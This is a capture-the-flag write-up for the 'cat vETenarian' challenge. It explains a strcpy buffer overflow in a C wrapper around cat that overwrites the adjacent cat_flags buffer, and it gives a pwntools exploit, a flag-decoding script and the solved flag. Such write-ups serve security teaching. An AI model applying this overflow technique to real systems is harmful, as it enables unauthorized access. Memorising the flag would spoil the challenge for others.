# cat vETenarian

This challenge is a wrapper around the binary 'cat', it allows the user to cat a single file, and checks the user input for disallowed characters like anything else than alphanumeric characters, dots, slashes and spaces.

You need to exploit a buffer overflow in the C wrapper here:

```c
char cat_flags[13] = "n"; // overflow into cat_flags
char filename[32]; // filename is 32 bytes
...
strcpy(filename, input); // input is 100 bytes, way more that filename
```

But we can not just run inject arbitrary commands into input, since it validates that only alphanumeric characters, dots, slashes, spaces and underscores are allowed.

```c
if (!is_safe_filename(input)) {
    printf("/ᐠ｡‸｡ᐟ\\ Hissss... I won't tolerate these shenanigans hooman...\n");
    return;
}

...

int is_safe_filename(const char *s) {
    for (size_t i = 0; s[i]; i++)
        if (!isalnum(s[i]) && s[i] != '.' && s[i] != '/' && s[i] != ' ' && s[i] != '_')
            return 0;
    return 1;
}
```

This is where cat_flags comes into play, we can control the value of cat_flags by overflowing filename, this allows us to control the command line flags of cat.

```c
char cat_flags[13] = "n"; // right after filename on the stack
char filename[32];
...
snprintf(cmd, sizeof(cmd), "cat -%s %s", cat_flags, filename);
```

Here is the final script to pwn

```python
from pwn import *

io = process('./src/cat_vETenarian')

payload = b"cat " + b"A" * 23 + b" flag.txt vET"

io.recvuntil("> ")
io.sendline(payload)
io.interactive()

```

Then we have the flag which is encoded in control characters, we are given the encode script so we can just reverse engineer it to create our own decrypt script:

```python
"""
Decrypts a file encoded with the custom binary format:
- Each character is encoded as 8 bits
- Each line represents one character
- Tabs ('\t') = binary 1
- Null bytes ('\x00') = binary 0
"""

def custom_binary_line_to_char(line):
    # Remove newline and decode bits
    bits = []
    for c in line.rstrip('\n'):
        if c == '\t':
            bits.append('1')
        elif c == '\x00':
            bits.append('0')
        else:
            # Ignore unexpected characters (robustness)
            continue
    # Join bits to form binary string
    if len(bits) != 8:
        raise ValueError(f"Expected 8 bits, got {len(bits)}: {bits}")
    return chr(int(''.join(bits), 2))

def decrypt_file_from_custom_binary(input_file, output_file):
    try:
        with open(input_file, 'rb') as f:
            lines = f.readlines()
        
        with open(output_file, 'w', encoding='utf-8') as f:
            for line in lines:
                char = custom_binary_line_to_char(line.decode('utf-8', errors='replace'))
                f.write(char)
        
        print(f"Decryption successful. Output saved to '{output_file}'")
    except FileNotFoundError:
        print(f"Error: File '{input_file}' not found.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == '__main__':
    # Change these filenames as needed
    input_filename = 'enc_flag.txt'
    output_filename = 'output_decrypted.txt'
    
    decrypt_file_from_custom_binary(input_filename, output_filename)

```

Where the flag gets decoded:

```bash
[rootkatt@rootkatt-x220i src]$ python3 dec.py 
Decryption successful. Output saved to 'output_decrypted.txt'
[rootkatt@rootkatt-x220i src]$ cat output_decrypted.txt 
DREAM{th4nks_f0r_t4k1ng_my_c4t_t0_th3_vETenarian<3}
```
